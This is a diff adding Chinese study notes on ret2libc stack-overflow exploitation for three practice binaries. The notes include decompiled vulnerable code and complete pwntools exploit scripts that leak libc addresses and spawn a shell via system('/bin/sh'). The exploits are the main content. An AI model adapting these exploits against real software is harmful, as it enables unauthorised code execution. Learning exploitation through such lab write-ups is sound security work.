@@ -263,3 +263,102 @@ ret2syscall
     sh.sendline(payload)  
     sh.interactive()  
   
+ ret2libc  
+  控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。  
+  一般情况下，我们会选择执行 system("/bin/sh")，故而此时我们需要知道 system 函数的地址。  
+  01.还是开启nx  
+  源程序： 
+    int __cdecl main(int argc, const char **argv, const char **envp)  
+   {  
+     int v4; // [sp+1Ch] [bp-64h]@1  
+  
+     setvbuf(stdout, 0, 2, 0);  
+     setvbuf(_bss_start, 0, 1, 0);  
+     puts("RET2LIBC >_<");  
+     gets((char *)&v4);  
+     return 0;  
+   }  
+  还是gets。  
+  利用ropgadgets查看/bin/sh，利用ida查system函数，均存在，直接执行。  
+  payload：  
+    #!/usr/bin/env python  
+    from pwn import *  
+  
+    sh = process('./ret2libc1')  
+  
+    binsh_addr = 0x8048720  
+    system_plt = 0x08048460  
+    payload = flat(['a' * 112, system_plt, 'b' * 4, binsh_addr])  
+    sh.sendline(payload)  
+  
+    sh.interactive()  
+  02.其他同上，但不存在/bin/sh  
+  需要自己读取字符串，俩gadgets，第一个控制程序读取字符串，第二个控制程序执行 system("/bin/sh")。  
+  exp：  
+    ##!/usr/bin/env python  
+    from pwn import *  
+  
+    sh = process('./ret2libc2')  
+  
+    gets_plt = 0x08048460  
+    system_plt = 0x08048490  
+    pop_ebx = 0x0804843d  
+    buf2 = 0x804a080  
+    payload = flat(  
+        ['a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])  
+    sh.sendline(payload)  
+    sh.sendline('/bin/sh')  
+    sh.interactive()  
+  03.system函数与/bin/sh均不存在  
+  还是nx开启。  
+  源程序：  
+    int __cdecl main(int argc, const char **argv, const char **envp)  
+   {  
+     int v4; // [sp+1Ch] [bp-64h]@1  
+  
+     setvbuf(stdout, 0, 2, 0);  
+     setvbuf(stdin, 0, 1, 0);  
+     puts("No surprise anymore, system disappeard QQ.");  
+     printf("Can you find it !?");  
+     gets((char *)&v4);  
+     return 0;  
+   }  
+ 本题相对于02，重点在于查找system函数  
+ ![image](https://user-images.githubusercontent.com/96966904/147907561-81850006-4e41-4677-b559-13224ac56920.png)  
+ https://github.com/niklasb/libc-database  
+ 所以要找到libc中某个函数的地址，从而找到system函数  
+ 得到 libc 中的某个函数的地址，一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。  
+ 由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。  
+ 但上述步骤太麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme  
+ https://github.com/lieanu/LibcSearcher  
+ libc中也有/bin/sh，可以一并获得。  
+ 泄露 __libc_start_main 的地址，因为它是程序最初被执行的地方。基本思路如下：  
+ ![image](https://user-images.githubusercontent.com/96966904/147907941-150f327a-810c-4b06-be11-117440046f80.png)  
+ exp:  
+   #!/usr/bin/env python  
+   from pwn import *  
+   from LibcSearcher import LibcSearcher  
+   sh = process('./ret2libc3')  
+  
+   ret2libc3 = ELF('./ret2libc3')  
+  
+   puts_plt = ret2libc3.plt['puts']  
+   libc_start_main_got = ret2libc3.got['__libc_start_main']  
+   main = ret2libc3.symbols['main']  
+  
+   print "leak libc_start_main_got addr and return to main again"  
+   payload = flat(['A' * 112, puts_plt, main, libc_start_main_got])  
+   sh.sendlineafter('Can you find it !?', payload)  
+  
+   print "get the related addr"  
+   libc_start_main_addr = u32(sh.recv()[0:4])  
+   libc = LibcSearcher('__libc_start_main', libc_start_main_addr)  
+   libcbase = libc_start_main_addr - libc.dump('__libc_start_main')  
+   system_addr = libcbase + libc.dump('system')   
+   binsh_addr = libcbase + libc.dump('str_bin_sh')  
+  
+   print "get shell"  
+   payload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr])  
+   sh.sendline(payload)  
+  
+   sh.interactive()  
